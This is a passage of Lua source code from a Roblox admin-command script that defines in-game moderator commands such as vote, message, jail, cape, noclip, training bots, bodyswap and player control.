--set.Remote(plr,'SetSetting','AdminListTable',temptable)
set.Remote(plr,'Function','ListGui','Admin List',temptable)
end)

set.MakeCommand('Shows you the normal ban list',2,set.Prefix,{'banlist','banned','bans'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','Banlist',set['BanList'])
set.Remote(plr,'Function','ListGui','Ban List',set.BanList)
end)

set.MakeCommand('Lets you send players a yes or no question and then displays percentages when done',2,set.Prefix,{'vote','makevote','startvote','question','survey'},{'player','time','question'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local Time=tonumber(args[2]) 
local question=args[3]
local tname=plr.Name..question
set.OpenVote[tname]={}
local vote=set.OpenVote[tname]
if Time > 60 then Time = 60 end
vote.Yes=0
vote.No=0
vote.novote={}
for ik,pl in pairs(plrz) do
set.Remote(pl,'Function','VoteQuestion',tname,question,Time)
table.insert(vote.novote, pl)
end
wait(Time+1)
set.Remote(plr,'Function','VoteResults',question,set.Round(vote.Yes/#plrz*100),set.Round(vote.No/#plrz*100),set.Round(#vote.novote/#plrz*100),vote.Yes,vote.No,#vote.novote)
end)

set.MakeCommand('Shows you a list of tools that can be obtains via the give command',2,set.Prefix,{'tools','toollist'},{},0,function(plr,args)
local temptable={}
for i, v in pairs(set.Storage:children()) do 
	if v:IsA("Tool") or v:IsA("HopperBin") then 
		table.insert(temptable,{Object=v.Name,Desc=v:GetFullName()})
	end 
end
--set.Remote(plr,'SetSetting','toollist',temptable)
set.Remote(plr,'Function','ListGui','Tools',temptable)
end)

set.MakeCommand('Inserts whatever object belongs to the ID you supply, the object must be in the place owner\'s or ROBLOX\'s inventory',2,set.Prefix,{'insert','ins'},{'id'},1,function(plr,args)
local obj = game:service("InsertService"):LoadAsset(tonumber(args[1]))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(set.objects, obj) for i,v in pairs(obj:children()) do table.insert(set.objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end)

set.MakeCommand('Remove admin objects',2,set.Prefix,{'clear','cleargame','clr'},{},0,function(plr,args)
for i,v in pairs(set.objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
for i,v in pairs(set.cameras) do if v then table.remove(set.cameras,i) v:Destroy() end end
for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Message') or v:IsA('Hint') then v:Destroy() end if v.Name:match('Kohls Probe (.*)') then v:Destroy() end end
set.objects = {}
set.RemoveMessage()
end)

set.MakeCommand('Reset lighting back to the setting it had on server start',2,set.Prefix,{'fix','resetlighting','undisco','unflash','fixlighting'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
game:service('Lighting').Ambient = set.OrigLightingSettings.abt
game:service('Lighting').GlobalShadows = set.OrigLightingSettings.gs
game:service('Lighting').ShadowColor = set.OrigLightingSettings.sc
game:service('Lighting').Outlines = set.OrigLightingSettings.ol
game:service('Lighting').OutdoorAmbient = set.OrigLightingSettings.oabt
game:service('Lighting').Brightness = set.OrigLightingSettings.brt
game:service('Lighting').TimeOfDay = set.OrigLightingSettings.time
game:service('Lighting').FogColor = set.OrigLightingSettings.fclr
game:service('Lighting').FogEnd = set.OrigLightingSettings.fe
game:service('Lighting').FogStart = set.OrigLightingSettings.fs
end)

set.MakeCommand('Opens the command box',2,set.Prefix,{'cmdbar','commandbar','cmdbox','commandbox','cmdgui','commandgui'},{},0,function(plr,args)
set.CmdBar(plr)
end)

set.MakeCommand('Countdown',2,set.Prefix,{'countdown'},{'time'},1,function(plr,args)
local num = math.min(tonumber(args[1]),120)
for i = num, 1, -1 do
coroutine.resume(coroutine.create(function() set.Message(" ", i, false, game:service('Players'):children(), 1) end))
wait(1)
end
end)

set.MakeCommand('Make a message and makes it stay for the amount of time (in seconds) you supply',2,set.Prefix,{'tm','timem','timedmessage'},{'time','message'},2,function(plr,args) 
local num = args[1]
set.Message("Message from " .. plr.Name, args[2], false, game:service('Players'):children(), num)
end)

set.MakeCommand('Makes a message',2,set.Prefix,{'m','message'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Message("Message from " .. plr.Name, args[1], true, game:service('Players'):children())
end)

set.MakeCommand('Makes a hint',2,set.Prefix,{'h','hint'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Hint(plr.Name .. ": " .. args[1], game:service('Players'):children())
end)

set.MakeCommand('Shows you information about the target player',2,set.Prefix,{'info','age'},{'player'},1,function(plr,args)
	local plz = set.GetPlayers(plr, args[1]:lower())
	for i,v in pairs(plz) do
	coroutine.wrap(function()
	set.GetPlayerInfo(v,{plr},'Player Info')
	end)()
	end
end)

set.MakeCommand('Sets target player(s)\'s leadder stats to 0',2,set.Prefix,{'resetstats'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then
for a,q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) a gear from the catalog based on the ID you supply',2,set.Prefix,{'gear','givegear'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Backpack end end
obj:Destroy()
end
end))
end
end)

set.MakeCommand('Prompts the player(s) to buy the product beloging to the ID you supply',2,set.Prefix,{'sell'},{'player','id','currency'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
local type = args[3] or 'default'
local t
if type:lower()=='tix' or type:lower()=='tickets' or type:lower()=='t' then
	t=Enum.CurrencyType.Tix
elseif type:lower()=='robux' or type:lower()=='rb' or type:lower()=='r' then
	t=Enum.CurrencyType.Robux
else
	t=Enum.CurrencyType.Default
end
if v then
game:GetService("MarketplaceService"):PromptPurchase(v,tonumber(args[2]),false,t)
end
end))
end
end)

set.MakeCommand('Gives the target player(s) a hat based on the ID you supply',2,set.Prefix,{'hat','givehat'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end)

set.MakeCommand('Shows you the list of capes for the cape command',2,set.Prefix,{'capes','capelist'},{},0,function(plr,args)
local list = {"script","new yeller","pastel blue","dusty rose","cga brown","random","shiny","gold","kohl","epix","superman","swag","donor","starbucks","gomodern","admin","host","cohost","trainer","giovannis"}
--set.Remote(plr,'SetSetting','CapeList',list)
set.Remote(plr,'Function','ListGui','Cape List',list)
end)

set.MakeCommand('Gives the target player(s) the cape specified, do '..set.Prefix..'capes to view a list of available capes ',2,set.Prefix,{'cape','givecape'},{'player','cape/color/id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
if not args[2] then args[2]='White' end
for i,v in pairs(plrz) do
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
if args[2]:lower() == "new yeller" then set.Cape(v,'Fabric',"New Yeller") 
elseif args[2]:lower() == "pastel blue" then set.Cape(v,'Fabric',"Pastel Blue") 
elseif args[2]:lower() == "dusty rose" then set.Cape(v,'Fabric',"Dusty Rose") 
elseif args[2]:lower() == "cga brown" then set.Cape(v,'Fabric',"CGA brown") 
elseif args[2]:lower() == "random" then set.Cape(v,'Fabric',BrickColor.random()) 
elseif args[2]:lower() == "shiny" then set.Cape(v,'Plastic',"Institutional white",false,1) 
elseif args[2]:lower() == "gold" then set.Cape(v,'Plastic',"Bright yellow",false,0.4)
elseif args[2]:lower() == "kohl" then set.Cape(v,'Fabric',"Really black","108597653") 
elseif args[2]:lower() == "script" then set.Cape(v,'Plastic',"White","151359194") 
elseif args[2]:lower() == "batman" then set.Cape(v,'Fabric',"Institutional white","108597669") 
elseif args[2]:lower() == "epix" then set.Cape(v,'Plastic',"Really black","149442745") 
elseif args[2]:lower() == "superman" then set.Cape(v,'Fabric',"Bright blue","108597677") 
elseif args[2]:lower() == "swag" then set.Cape(v,'Fabric',"Pink","109301474") 
elseif args[2]:lower() == "donor" then set.Cape(v,'Plastic',"White","149009184") 
elseif args[2]:lower() == "starbucks" then set.Cape(v,'Plastic',"Black","149248066") 
elseif args[2]:lower() == "gomodern" then set.Cape(v,'Plastic',"Really black","149438175") 
elseif args[2]:lower() == "admin" then set.Cape(v,'Plastic',"White","149092195") 
elseif args[2]:lower() == "giovannis" then set.Cape(v,'Plastic',"White","149808729") 
elseif args[2]:lower() == "godofdonuts" then set.Cape(v,'Plastic',"Institutional white","151034443") 
elseif args[2]:lower() == "host" then set.Cape(v,'Plastic',"Really black","152299000") 
elseif args[2]:lower() == "cohost" then set.Cape(v,'Plastic',"Really black","152298950") 
elseif args[2]:lower() == "trainer" then set.Cape(v,'Plastic',"Really black","152298976") 
elseif args[2]:lower() == "ba" or args[2]:lower() == "beardedalien" or args[2]:lower() == "beard" then set.Cape(v,'Plastic','White',172528001)
elseif BrickColor.new(args[2]) ~= nil then set.Cape(v,'Fabric',args[2]) 
elseif tonumber(args[2]) ~= nil then set.Cape(v,'Fabric','White',args[2]) 
end
end
end)

set.MakeCommand('Removes the target player(s)\'s cape',2,set.Prefix,{'uncape','removecape'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function() v.Character.EpicCape:Destroy() end)
end
end)

set.MakeCommand('Makes the target player(s) slide when they walk',2,set.Prefix,{'slippery','iceskate','icewalk','slide'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','slip')
end
end)

set.MakeCommand('NoClips the target player(s)',2,set.Prefix,{'noclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','norm')
end
end)

set.MakeCommand('Old flying NoClip',2,set.Prefix,{'flynoclip','oldnolcip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','fly')
end
end)

set.MakeCommand('Un-NoClips the target player(s)',2,set.Prefix,{'clip','unnoclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','off')
end
end)

set.MakeCommand('Jails the target player(s), removing their tools until they are un-jailed',2,set.Prefix,{'jail','imprison'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v.Character and v.Character:FindFirstChild("Torso") then 
local cf = v.Character.Torso.CFrame + Vector3.new(0,1,0)
local origpos = v.Character.Torso.Position
local mod = Instance.new("Model", game.Workspace) mod.Name = v.Name .. " Epix Jail" table.insert(set.objects, mod) 
local value = Instance.new('StringValue',mod) value.Name='Player' value.Value=v.Name
local top = Instance.new("Part", mod) top.Locked = true top.formFactor = "Symmetric" top.Size = Vector3.new(6,1,6) top.TopSurface = 0 top.BottomSurface = 0 top.Anchored = true top.BrickColor = BrickColor.new("Really black") top.CFrame = cf * CFrame.new(0,-3.5,0)
set.JailedTools[v.Name]=Instance.new('Model') 
local bottom = top:Clone() bottom.Transparency = 1 bottom.Parent = mod bottom.CFrame = cf * CFrame.new(0,3.5,0)
local front = top:Clone() front.Transparency = 1 front.Reflectance = 0 front.Parent = mod front.Size = Vector3.new(6,6,1) front.CFrame = cf * CFrame.new(0,0,-3)
local back = front:Clone() back.Transparency = 1 back.Parent = mod back.CFrame = cf * CFrame.new(0,0,3)
local right = front:Clone() right.Transparency = 1 right.Parent = mod right.Size = Vector3.new(1,6,6) right.CFrame = cf * CFrame.new(3,0,0)
local left = right:Clone() left.Transparency = 1 left.Parent = mod left.CFrame = cf * CFrame.new(-3,0,0)
local msh = Instance.new("BlockMesh", front) msh.Scale = Vector3.new(1,1,0)
local msh2 = msh:Clone() msh2.Parent = back
local msh3 = msh:Clone() msh3.Parent = right msh3.Scale = Vector3.new(0,1,1)
local msh4 = msh3:Clone() msh4.Parent = left
local brick = Instance.new('Part',mod)
local box = Instance.new('SelectionBox',brick)
box.Adornee=brick
box.Color=BrickColor.new('White')
brick.Anchored=true
brick.CanCollide=false
brick.Transparency=1
brick.Size=Vector3.new(5,7,5) 
brick.CFrame=cf--*CFrame.new(0,-1,0)
v.Character.Torso.CFrame = cf
for l,k in pairs(v.Backpack:children()) do 
	if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then 
		k.Parent=set.JailedTools[v.Name]
	end 
end
coroutine.wrap(function()
repeat
	local player=game:service('Players'):FindFirstChild(v.Name)
	if not player then return end
	local torso=player.Character:FindFirstChild('Torso')
	if not torso then return end
	if not set.JailedTools[v.Name] or set.JailedTools[v.Name]==nil then set.JailedTools[v.Name]=Instance.new('Model') end
	for l,k in pairs(player.Backpack:children()) do 
		if k and k.ClassName=='Tool' or k.ClassName=='HopperBin' then 
			k.Parent=set.JailedTools[v.Name]--tools 
		end 
	end 
	if (torso.Position-origpos).magnitude>5 then
		torso.CFrame = cf 
	end
	wait()
until not mod or not mod.Parent or set.JailedTools[v.Name]==nil
end)()
end
end)()
end
end)

set.MakeCommand('UnJails the target player(s) and returns any tools that were taken from them while jailed',2,set.Prefix,{'unjail','free','release'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do 
	coroutine.wrap(function() 
		if v then 
			for a, jl in pairs(game.Workspace:children()) do 
				if jl.Name == v.Name .. " Epix Jail" then 
					jl:Destroy() 
				end 
			end 
		if set.JailedTools[v.Name] then
			for j,tewl in pairs(set.JailedTools[v.Name]:children()) do 
				if tewl then
					tewl.Parent=v.Backpack 
				end
			end
			set.JailedTools[v.Name]=nil
		end
	set.JailedTools[v.Name]=nil 
end
end)()
end
end)

set.MakeCommand('Gives the target player(s) a little chat gui, when used will let them chat using dialog bubbles',2,set.Prefix,{'bchat','dchat','bubblechat','dialogchat'},{'player','color(red/green/blue)'},2,function(plr,args)
	local color=Enum.ChatColor.Red
	if not args[2] then
		color=Enum.ChatColor.Red
	elseif args[2]:lower()=='red' then
		color=Enum.ChatColor.Red
	elseif args[2]:lower()=='green' then
		color=Enum.ChatColor.Green
	elseif args[2]:lower()=='blue' then
		color=Enum.ChatColor.Blue
	end
	for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
		set.Remote(v,"Function","BubbleChat",color)
	end
end)

set.MakeCommand('Shows you where the target player(s) is/are',2,set.Prefix,{'track','trace','find'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Find','on',v)
	end
end)

set.MakeCommand('Stops tracking the target player(s)',2,set.Prefix,{'untrack','untrace','unfind'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		set.Remote(plr,'Function','Find','off',v)
	end
end)

set.MakeCommand('Makes the target player(s)\'s character teleport back and forth rapidly, quite trippy, makes bricks appear to move as the player turns their character',2,set.Prefix,{'glitch','glitchdisorient','glitch1','gd'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 15
		set.Remote(v,'Function','Glitch','trippy',num)
	end
end)

set.MakeCommand('The same as gd but less trippy, teleports the target player(s) back and forth in the same direction, making two ghost like images of the game',2,set.Prefix,{'glitch2','glitchghost','gg'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 150
		set.Remote(v,'Function','Glitch','ghost',num)
	end
end)

set.MakeCommand('Kinda like gd, but teleports the player to four points instead of two',2,set.Prefix,{'vibrate','glitchvibrate','gv'},{'player','intensity'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		local num=args[2] or 0.1
		set.Remote(v,'Function','Glitch','vibrate',num)
	end
end)

set.MakeCommand('UnGlitchs the target player(s)',2,set.Prefix,{'unglitch','unglitchghost','ungd','ungg','ungv'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		set.Remote(v,'Function','Glitch','off')
	end
end)

set.MakeCommand('Shows you the current message of the day',0,set.AnyPrefix,{'motd','messageoftheday','daymessage'},{},0,function(plr,args)
	set.PM('Message of the Day',plr,game:service('MarketplaceService'):GetProductInfo(set.MessageOfTheDayID).Description)
end)

set.MakeCommand('Makes a clone of target player(s)\'s character and parents their real on to their local camera, no one can see them until they are unphased',2,set.Prefix,{'phase'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		coroutine.wrap(function()
		for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
		set.Remote(v,'Function','Phase',false)
		wait(set.Ping(v)+0.3)
		for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
		v.Character.Archivable=true
		local hum=v.Character:FindFirstChild('Humanoid')
		local cl=v.Character:clone()
		v.Character.Archivable=false
		pcall(function() cl.Animate:Destroy() end)
		local anim=deps.Animate:clone()
		anim.Parent=cl
		anim.Disabled=false
		local val=Instance.new('StringValue',cl)
		val.Name='FakeCharPhased'
		cl.Parent=workspace
		v.Character.Torso.CFrame=v.Character.Torso.CFrame*CFrame.new(0,0,1)
		for a,obj in pairs(v.Character:children()) do if obj:IsA("BasePart") then obj.Transparency = 1 if obj:findFirstChild("face") then obj.face.Transparency = 1 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 1 end end
		set.Remote(v,'Function','Phase',true)
		repeat wait() until not hum or not hum.Parent or not cl or not cl.Parent
		if cl then cl:Destroy() end
		end)()
	end
end)

set.MakeCommand('UnPhases the target player(s)',2,set.Prefix,{'unphase'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr, args[1])) do
		for k,m in pairs(workspace:children()) do if m.Name==v.Name and m:FindFirstChild('FakeCharPhased') then m:Destroy() end end
		set.Remote(v,'Function','Phase',false)
		v.Character:MakeJoints()
		print(v.Character.Humanoid.Health)
		wait(set.Ping(v)+0.3)
		v.Character:MakeJoints()
		print(v.Character.Humanoid.Health)
		for a,obj in pairs(v.Character:children()) do if obj.Name~='HumanoidRootPart' then if obj:IsA("BasePart") then obj.Transparency = 0 if obj:findFirstChild("face") then obj.face.Transparency = 0 end elseif obj:IsA("Hat") and obj:findFirstChild("Handle") then obj.Handle.Transparency = 0 end end end
	end
end)

set.MakeCommand('Removes the bubble chat gui from the target player(s)',2,set.Prefix,{'unbchat','unbubblechat','undchat','undialogchat'},{'player'},1,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,(args[1] or plr.Name))) do
		set.Remote(v,'Function','BubbleChat','off')
	end
end)

set.MakeCommand('Gives the target player(s) tools that are in their StarterPack',2,set.Prefix,{'startertools','starttools'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
for a,q in pairs(game.StarterPack:children()) do q:Clone().Parent = v.Backpack end
end
end))
end
end)

set.MakeCommand('Gives the target player(s) a sword',2,set.Prefix,{'sword','givesword'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local sword = Instance.new("Tool", v.Backpack) sword.Name = "Sword"  sword.TextureId = "rbxasset://Textures/Sword128.png"
sword.GripForward = Vector3.new(-1,0,0)
sword.GripPos = Vector3.new(0,0,-1.5)
sword.GripRight = Vector3.new(0,1,0)
sword.GripUp = Vector3.new(0,0,1)
local handle = Instance.new("Part", sword) handle.Name = "Handle" handle.FormFactor = "Plate" handle.Size = Vector3.new(1,.8,4) handle.TopSurface = 0 handle.BottomSurface = 0
local msh = Instance.new("SpecialMesh", handle) msh.MeshId = "rbxasset://fonts/sword.mesh" msh.TextureId = "rbxasset://textures/SwordTexture.png"
local cl=deps.SwordScript:clone() cl.Parent=sword cl.Disabled=false
end
end))
end
end)

set.MakeCommand('Clones the target player(s)',2,set.Prefix,{'clone','cloneplayer'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then 
v.Character.Archivable = true 
local cl = v.Character:Clone() 
table.insert(set.objects,cl) 
cl.Parent = game.Workspace 
cl:MoveTo(v.Character:GetModelCFrame().p)
cl:MakeJoints()
v.Character.Archivable = false 
repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0
wait(5)
if cl then cl:Destroy() end
end
end)()
end
end)

set.MakeCommand('Configurable AIs made for training, :bot me 5 true true true makes 5 bots that attack, stack, and run to players to kill them',2,set.Prefix,{'bot','tbot','trainingbot','bots','robot','robots','dummy','dummys','testdummy','testdummys','dolls','doll'},{'plr','num','walk','attk','swarm','speed','dmg','hp','dist'},9,function(plr,args)
	local walk=false 
	if args[3] then if args[3]:lower()=='true' or args[3]:lower()=='yes' then walk=true end end
	local attack=false
	if args[4] then if args[4]:lower()=='true' or args[4]:lower()=='yes' then attack=true end end
	local health=args[8] or 100
	local damage=args[7] or 10
	local walkspeed=args[6] or 20
	local dist=args[9] or 100
	local swarm=false
	if args[5] then if args[5]:lower()=='true' or args[5]:lower()=='yes' then swarm=true end end
	local function makedolls(player)
		local num=args[2] or 1
		local pos=player.Character.Torso.CFrame
		num=tonumber(num)
		if num>50 then num=50 end
		for i=1,num do
			coroutine.wrap(function()
				player.Character.Archivable = true
				local cl = player.Character:Clone() 
				player.Character.Archivable = false
				table.insert(set.objects,cl)
				local anim=script['Script Dependencies'].Animate:Clone()
				anim.Parent=cl 
				anim.Disabled=false
				cl.Parent = game.Workspace 
				cl.Name='~=Bot=~'
				if cl:FindFirstChild('Animate') then cl.Animate:Destroy() end
				cl.Humanoid.MaxHealth=health
				wait()
				cl.Humanoid.Health=health
				cl.Torso.CFrame=pos*CFrame.Angles(0,math.rad(360/num*i),0)*CFrame.new(5+.2*num,0,0)
				cl:MakeJoints()
				cl.Humanoid.WalkSpeed=walkspeed
				for k,f in pairs(cl:children()) do if f.ClassName=='ForceField' then f:Destroy() end end
				local run=true
				local thing
				local target
				local chasing=false
				local function find()
					for k,n in pairs(game:service('Players'):GetPlayers()) do
						coroutine.wrap(function()
							if swarm and not chasing and n:DistanceFromCharacter(cl.Torso.Position) < tonumber(dist) then
								n=n.Character
								if not n:FindFirstChild('Humanoid') or not n:FindFirstChild('Torso') or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') then return end
								target=n.Torso
								chasing=true
								repeat wait() until chasing==false or n.Humanoid.Health<=0 or n.Humanoid.Health>=math.huge or n:FindFirstChild('ForceField') or not n:FindFirstChild('Torso') or not n
								chasing=false
							end
						end)()
					end
				end
				coroutine.wrap(function()
					if not cl.Humanoid or not cl.Torso then return end
					thing=cl.Torso.Touched:connect(function(hit) 
						coroutine.wrap(function()
							if attack and run and cl and hit.Parent:FindFirstChild('Humanoid') and hit.Parent:FindFirstChild('Torso') and hit.Parent.Name~='~=Bot=~' then
								if hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') then return end
								hit.Parent.Humanoid.Health=hit.Parent.Humanoid.Health-damage
								target=hit.Parent.Torso
								chasing=true
								repeat wait() until chasing==false or hit.Parent.Humanoid.Health<=0 or hit.Parent.Humanoid.Health>=math.huge or hit.Parent:FindFirstChild('ForceField') or not hit.Parent:FindFirstChild('Torso') or not hit.Parent
								chasing=false
							end
						end)()
						
					end)
					repeat
						if not walk then return end
						if cl.Humanoid.Sit then
							cl.Humanoid.Jump=true
							cl.Humanoid.Sit=false
						end
						if chasing then
							wait() 
							cl.Humanoid.WalkToPoint=target.Position
							if math.abs(cl.Torso.Position.Y-target.Position.Y)>7 then
								cl.Humanoid.Jump=true
							end
						else
							cl.Humanoid.WalkToPoint=Vector3.new(math.random(cl.Torso.Position.X-100,cl.Torso.Position.X+100),cl.Torso.Position.Y,math.random(cl.Torso.Position.Z-100,cl.Torso.Position.Z+100))
							wait(1)
						end
						pcall(find)
						wait()
					until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
				end)()
				repeat wait() until not cl or not cl.Humanoid or cl.Humanoid.Health<=0 or not run
				run=false
				pcall(function() thing:disconnect() end)
				wait(2)
				pcall(function() if cl then cl:Destroy() end end)
			end)()
		end
	end
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
		makedolls(v)
	end
end)

set.MakeCommand('Gives you a tool that lets you click where you want the target player to stand, hold r to rotate them',2,set.Prefix,{'clickteleport','teleporttoclick','ct','clicktp','forceteleport','ctp','ctt'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Teleport'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)

set.MakeCommand('Gives you a tool that lets you click where you want the target player to walk, hold r to rotate them',2,set.Prefix,{'clickwalk','cw','ctw','forcewalk','walktool','walktoclick','clickcontrol','forcewalk'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
local tool=Instance.new('HopperBin',plr.Backpack)
local cl=deps.ClickToTool:clone()
cl.Target.Value=v.Name
cl.Mode.Value='Walk'
cl.Parent=tool
cl.Disabled=false
end)()
end
end)

set.MakeCommand('Swaps player1\'s and player2\'s bodies and tools',2,set.Prefix,{'bodyswap','bodysteal','bswap'},{'player1','player2'},2,function(plr,args)
	for i,v in pairs(set.GetPlayers(plr,args[1])) do
	for i2,v2 in pairs(set.GetPlayers(plr,args[2])) do
		local temptools=Instance.new('Model')
		local tempcloths=Instance.new('Model')
		local vpos=v.Character.Torso.CFrame
		local v2pos=v2.Character.Torso.CFrame
		local vface=v.Character.Head.face
		local v2face=v2.Character.Head.face
		vface.Parent=v2.Character.Head
		v2face.Parent=v.Character.Head
		for k,p in pairs(v.Character:children()) do
			if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
				p.Parent=tempcloths
			elseif p:IsA('Tool') then
				p.Parent=temptools
			end
		end	
		for k,p in pairs(v.Backpack:children()) do
			p.Parent=temptools
		end
		for k,p in pairs(v2.Character:children()) do
			if p:IsA('BodyColors') or p:IsA('CharacterMesh') or p:IsA('Pants') or p:IsA('Shirt') or p:IsA('Hat') then
				p.Parent=v.Character
			elseif p:IsA('Tool') then
				p.Parent=v.Backpack
			end
		end	
		for k,p in pairs(tempcloths:children()) do
			p.Parent=v2.Character
		end	
		for k,p in pairs(v2.Backpack:children()) do
			p.Parent=v.Backpack
		end
		for k,p in pairs(temptools:children()) do
			p.Parent=v2.Backpack
		end
		v2.Character.Torso.CFrame=vpos
		v.Character.Torso.CFrame=v2pos
	end
	end 
end)

set.MakeCommand('Lets you take control of the target player',2,set.Prefix,{'control','takeover'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v.Character then
v.Character.Humanoid.PlatformStand = true
local w = Instance.new("Weld", plr.Character.Torso ) 
w.Part0 = plr.Character.Torso 
w.Part1 = v.Character.Torso  
local w2 = Instance.new("Weld", plr.Character.Head) 
w2.Part0 = plr.Character.Head 
w2.Part1 = v.Character.Head  
local w3 = Instance.new("Weld", plr.Character:findFirstChild("Right Arm")) 
w3.Part0 = plr.Character:findFirstChild("Right Arm")
w3.Part1 = v.Character:findFirstChild("Right Arm") 
local w4 = Instance.new("Weld", plr.Character:findFirstChild("Left Arm"))
w4.Part0 = plr.Character:findFirstChild("Left Arm")
w4.Part1 = v.Character:findFirstChild("Left Arm") 
local w5 = Instance.new("Weld", plr.Character:findFirstChild("Right Leg")) 
w5.Part0 = plr.Character:findFirstChild("Right Leg")
w5.Part1 = v.Character:findFirstChild("Right Leg") 
local w6 = Instance.new("Weld", plr.Character:findFirstChild("Left Leg")) 
w6.Part0 = plr.Character:findFirstChild("Left Leg")
w6.Part1 = v.Character:findFirstChild("Left Leg") 
plr.Character.Head.face:Destroy()
for i, p in pairs(v.Character:children()) do
if p:IsA("BasePart") then 
p.CanCollide = false
end
end
for i, p in pairs(plr.Character:children()) do
if p:IsA("BasePart") then 
p.Transparency = 1 
elseif p:IsA("Hat") then
p:Destroy()
end
end
v.Character.Parent = plr.Character
--v.Character.Humanoid.Changed:connect(function() v.Character.Humanoid.PlatformStand = true end)
end
end)()
end
end)

set.MakeCommand('Refreshes the target player(s)\'s character',2,set.Prefix,{'refresh','reset'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
